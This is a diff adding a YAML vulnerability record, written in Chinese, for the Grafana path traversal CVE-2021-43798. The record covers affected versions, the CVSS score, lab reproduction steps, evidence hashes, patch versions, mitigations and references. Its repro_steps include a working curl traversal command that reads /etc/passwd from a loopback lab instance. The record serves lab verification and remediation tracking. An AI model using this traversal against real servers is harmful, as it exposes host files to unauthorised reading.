@@ -1,0 +1,72 @@
+id: VULN-2026-0001
+cve: CVE-2021-43798
+title: Grafana 插件静态资源路由路径穿越导致任意文件读取
+component: Grafana 8.2.6
+affected_versions:
+- scheme: semver
+  introduced: 8.0.0
+  fixed: 8.0.7
+  exclude: []
+- scheme: semver
+  introduced: 8.1.0
+  fixed: 8.1.8
+  exclude: []
+- scheme: semver
+  introduced: 8.2.0
+  fixed: 8.2.7
+  exclude: []
+- scheme: semver
+  introduced: 8.3.0
+  fixed: 8.3.1
+  exclude: []
+cwe: CWE-22 路径穿越（Path Traversal）
+cvss_vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+cvss_score: 7.5
+severity: 高
+attack_path:
+- 1. 未授权访问 Grafana Web 入口 http://127.0.0.1:<LAB_PORT>/login，从响应头与登录页指纹确认组件为 Grafana
+- 2. 利用 /public/plugins/<plugin>/ 静态资源路由可拼接 ../ 序列，绕过 Web 根目录限制
+- 3. 读取 /etc/passwd 等任意可读文件，泄露主机账户/配置文件（仅机密性受影响，C:H I:N A:N）
+preconditions:
+- 网络可达 Grafana 3000 端口（本部署仅 127.0.0.1:<LAB_PORT>，容器端口只绑回环）
+- 目标存在已安装插件（默认 alertlist 即可）且前置代理未做路径归一化
+- 无需认证、无需用户交互（PR:N / UI:N）
+repro_steps:
+- cmd: curl -s -i http://127.0.0.1:<LAB_PORT>/login
+  expect: HTTP 200，响应体含 Grafana 登录页特征
+- cmd: curl -s --path-as-is http://127.0.0.1:<LAB_PORT>/public/plugins/alertlist/../../../../../../../../etc/passwd
+  expect: HTTP 200，响应体含 root:x:0
+evidence:
+- path: evidence/VULN-2026-0001/20261026T132730Z/env.txt
+  sha256: 6240274e40e296e664fcdb9a8d49623700d87a099a0c314f353a7a529c153ba3
+  ts: '2026-10-26T13:27:32.217Z'
+- path: evidence/VULN-2026-0001/20261026T132730Z/request.txt
+  sha256: a2d74b065f75c2b4f0569863d2a7095afa86d096bc48b146f3c0cb9ac0cdfaab
+  ts: '2026-10-26T13:27:32.217Z'
+- path: evidence/VULN-2026-0001/20261026T132730Z/command.txt
+  sha256: 5bc0240a9c075eae587930a930f2cc7760a8613b599af836db4996940eff7b91
+  ts: '2026-10-26T13:27:32.217Z'
+- path: evidence/VULN-2026-0001/20261026T132730Z/cleanup.txt
+  sha256: fec5d771360782188271bb62bd0c09c63d465b67430542817d442564933a02fd
+  ts: '2026-10-26T13:27:32.217Z'
+fix:
+  patch_version: 升级到 8.0.7 / 8.1.8 / 8.2.7 / 8.3.1（按所在次版本线升级，8.3.1 为 8.3.x 修复版）
+  config_mitigation:
+  - Grafana 仅绑定回环/内网并限制来源 IP，禁止公网暴露 3000 端口
+  - 反向代理层做路径归一化，拒绝含 ../ 的请求
+  - 禁用未使用的插件静态资源路由（或移除 alertlist 等默认插件）
+  detection_rule: 检测模块 H-0001/N-0101（异常请求/流量：路径穿越序列与敏感文件读取）
+references:
+- https://nvd.nist.gov/vuln/detail/CVE-2021-43798
+- https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p
+- https://grafana.com/blog/2021/12/08/an-update-on-0day-cve-2021-43798-grafana-directory-traversal/
+attack_technique: T1190
+lab:
+  kind: server
+  path: grafana/CVE-2021-43798
+  ports:
+  - 3000
+status: verified
+owner: 靶场模块
+created_at: '2026-10-26T13:00:00Z'
+updated_at: '2026-10-26T13:27:32.217Z'
